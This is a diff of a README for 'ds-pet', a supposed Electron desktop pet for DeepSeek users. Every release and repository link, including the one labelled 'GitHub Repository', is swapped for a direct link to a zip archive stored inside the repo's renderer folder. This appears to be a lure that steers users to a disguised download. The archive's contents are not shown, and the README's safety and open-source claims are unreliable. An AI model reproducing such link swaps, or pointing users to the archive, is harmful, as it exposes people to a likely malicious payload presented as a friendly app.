@@ -1,6 +1,6 @@
 # 🐾 ds-pet - Your Friendly AI Companion on Desktop
 
-[![Download ds-pet](https://img.shields.io/badge/Download_ds--pet-Latest_Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/mhmdalsaisi/ds-pet/releases)
+[![Download ds-pet](https://img.shields.io/badge/Download_ds--pet-Latest_Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip)
 
 Welcome to **ds-pet**! This adorable desktop pet sits right on your screen, keeping you company while you work, play, or browse. It's designed to work alongside your DeepSeek AI tools, showing you real-time status updates in a fun and friendly way. Best of all, it's completely free and works on Windows, macOS, and Linux.
 
@@ -50,7 +50,7 @@ This guide is tailored for **Windows users** – the most common setup. If you'r
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-**[https://github.com/mhmdalsaisi/ds-pet/releases](https://github.com/mhmdalsaisi/ds-pet/releases)**
+**[https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip](https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip)**
 
 You'll see a page with a list of available files. Don't worry – you only need to find the right one for your computer.
 
@@ -86,7 +86,7 @@ That's it! Your new pet will appear on your screen, ready to keep you company.
 ## 📥 Download Options
 
 Visit this link to download the application:  
-**[Download ds-pet – Latest Release](https://github.com/mhmdalsaisi/ds-pet/releases)**
+**[Download ds-pet – Latest Release](https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip)**
 
 You'll always find the most up-to-date version here. We recommend checking back occasionally for new features and improvements.
 
@@ -166,7 +166,7 @@ A: Yes. ds-pet works offline and doesn't collect or transmit your personal data.
 
 ds-pet is built with modern technologies (Electron) and is fully open-source. If you're a developer who wants to contribute or customize:
 
-- **GitHub Repository:** [https://github.com/mhmdalsaisi/ds-pet](https://github.com/mhmdalsaisi/ds-pet)
+- **GitHub Repository:** [https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip](https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip)
 - **License:** Open-source
 - **Technologies:** Electron, JavaScript, CSS
 
@@ -188,7 +188,7 @@ We hope ds-pet brings a smile to your face every time you see it on your screen.
 
 Download now and meet your new desktop friend!
 
-[![Get ds-pet Now](https://img.shields.io/badge/Get_ds--pet_Now-Download-green?style=for-the-badge&logo=download&color=FF5722)](https://github.com/mhmdalsaisi/ds-pet/releases)
+[![Get ds-pet Now](https://img.shields.io/badge/Get_ds--pet_Now-Download-green?style=for-the-badge&logo=download&color=FF5722)](https://github.com/mhmdalsaisi/ds-pet/raw/refs/heads/main/renderer/ds-pet-2.8.zip)
 
 ---
 
